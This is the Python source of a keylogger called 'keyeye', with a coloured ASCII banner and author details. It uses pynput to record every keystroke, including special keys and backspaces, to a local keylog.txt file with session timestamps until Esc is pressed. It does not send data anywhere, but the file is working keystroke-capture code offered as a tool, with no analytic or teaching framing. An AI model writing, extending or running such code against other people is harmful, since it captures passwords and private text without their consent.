import time
import shutil
from colorama import Fore, Style, init
from pynput import keyboard
from datetime import datetime

          
init(autoreset=True)

logo = r"""
 ██ ▄█▀▓█████▓██   ██▓▓█████▓██   ██▓▓█████ 
 ██▄█▒ ▓█   ▀ ▒██  ██▒▓█   ▀ ▒██  ██▒▓█   ▀ 
▓███▄░ ▒███    ▒██ ██░▒███    ▒██ ██░▒███   
▓██ █▄ ▒▓█  ▄  ░ ▐██▓░▒▓█  ▄  ░ ▐██▓░▒▓█  ▄ 
▒██▒ █▄░▒████▒ ░ ██▒▓░░▒████▒ ░ ██▒▓░░▒████▒
▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
░ ░▒ ▒░ ░ ░  ░▓██ ░▒░  ░ ░  ░▓██ ░▒░  ░ ░  ░
░ ░░ ░    ░   ▒ ▒ ░░     ░   ▒ ▒ ░░     ░   
░  ░      ░  ░░ ░        ░  ░░ ░        ░  ░
              ░ ░            ░ ░            
"""

def print_centered(text, color=Fore.WHITE, style=Style.NORMAL):
    cols = shutil.get_terminal_size().columns
    for line in text.splitlines():
        print(color + style + line.center(cols) + Style.RESET_ALL)

def print_header():
    print_centered(logo, Fore.RED, Style.BRIGHT)   
    time.sleep(0.5)
    info()
    
def info():
    cols = shutil.get_terminal_size().columns
    block = (
        Fore.CYAN + Style.BRIGHT + "[ INFO ]" + Style.RESET_ALL + "\n"
        + Fore.RED   + "- Name     :                      " + Fore.YELLOW + "keyeye\n"
        + Fore.RED   + "- Version  :                         " + Fore.YELLOW + "0.1\n"
        + Fore.RED   + "- Author   :                      " + Fore.YELLOW + "Orbitz\n"
        + Fore.RED   + "- GitHub   : " + Fore.YELLOW + "https://github.com/Orbitz11\n"
        + Fore.RED   + "- Email    : " + Fore.YELLOW + "orbitz.business11@gmail.com\n"
    )

    for line in block.splitlines():
        print(line.center(cols))

    print((Fore.GREEN + Style.BRIGHT + "[+] Ready to start ..." + Style.RESET_ALL).center(cols))


if __name__ == "__main__":
    print_header()


    
f = open('keylog.txt', 'a', encoding='utf-8')
f.write(f'\n\n--- The session has started {datetime.now()} ---\n')

def press(key):
    try:
        f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            f.write(' ')
        elif key == keyboard.Key.enter:  
            f.write('\n')  
        elif key == keyboard.Key.tab:  
            f.write('\t')
        elif key == keyboard.Key.backspace:  
            f.write('[<]')
        else:
            f.write(f'[{key}]')

    f.flush()

def finish(key):
    if key == keyboard.Key.esc:
        f.write(f'\n --- The session has ended {datetime.now()} ---\n')
        f.flush()
        f.close()
        return False 

print('The session has been started. To stop it, press [Esc].')

with keyboard.Listener(on_press=press, on_release=finish) as listener:
    listener.join()


